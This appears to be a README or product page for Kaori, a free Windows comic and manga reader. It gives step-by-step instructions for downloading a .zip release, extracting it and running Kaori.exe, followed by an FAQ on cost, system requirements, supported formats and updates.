📖 What is Kaori?

Kaori is a free comic reader designed for people who love manga and graphic novels. Whether you are a casual reader or a devoted collector, Kaori brings your entire comic library to life on your screen. No complicated settings. No confusing menus. Just open, click, and read.

Built for simplicity, Kaori focuses on the one thing that matters most: the reading experience. The clean interface fades away, leaving you immersed in the story. Your pages render beautifully, your progress is saved automatically, and your collection is organized beautifully.

🚀 Getting Started

Getting Kaori on your Windows computer is super straightforward. Follow these simple steps:

Step 1: Visit the Download Page

Click the link below to go to the official Kaori download page:

🔗 Visit this link to download the application

This is the official page where you will find the latest version of Kaori.

Step 2: Find the Latest Version

On the release page, look for the newest version of Kaori (the one at the top). There will be a button to download it. Make sure you choose the Windows version (typically labeled Windows or Win64).

The file will have the .zip extension, which is standard for Kaori releases.

Step 3: Download and Extract

Download and extract this file, then run the application. Here’s how:

  1. Wait for the download to finish (usually takes a minute or two).
  2. Open the downloaded .zip file. Windows has built-in support for this—just double-click it.
  3. Click Extract All in the top toolbar.
  4. Choose a destination folder (your Desktop or Downloads folder works great).
  5. Open the extracted folder and look for the file named Kaori.exe.
  6. Double-click Kaori.exe to launch the app. That’s it!

Step 4: Start Reading

Once Kaori is open, you will see a welcome screen. Simply click Add Comics, select the folder where your comics are stored, and Kaori will instantly show your entire library. Click any comic to open it and begin reading!

❓ Frequently Asked Questions

💻 Is Kaori completely free?

Yes! Kaori is free and open-source. You can use it as long as you want and share it with your friends.

🖥️ What are the system requirements?

Kaori works on any Windows 10 or Windows 11 PC with at least 4GB of RAM and a screen resolution of 1280x720 or higher. No special hardware needed.

📁 What file formats can I read?

Kaori supports common comic formats like CBZ, CBR, PDF, and images (JPG, PNG, WebP). If you have a folder of images, Kaori can read that too.

🔄 How do I update Kaori?

You will see a notification when a new update is available. Simply download the new version and extract it to the same location—your library and progress will be preserved.
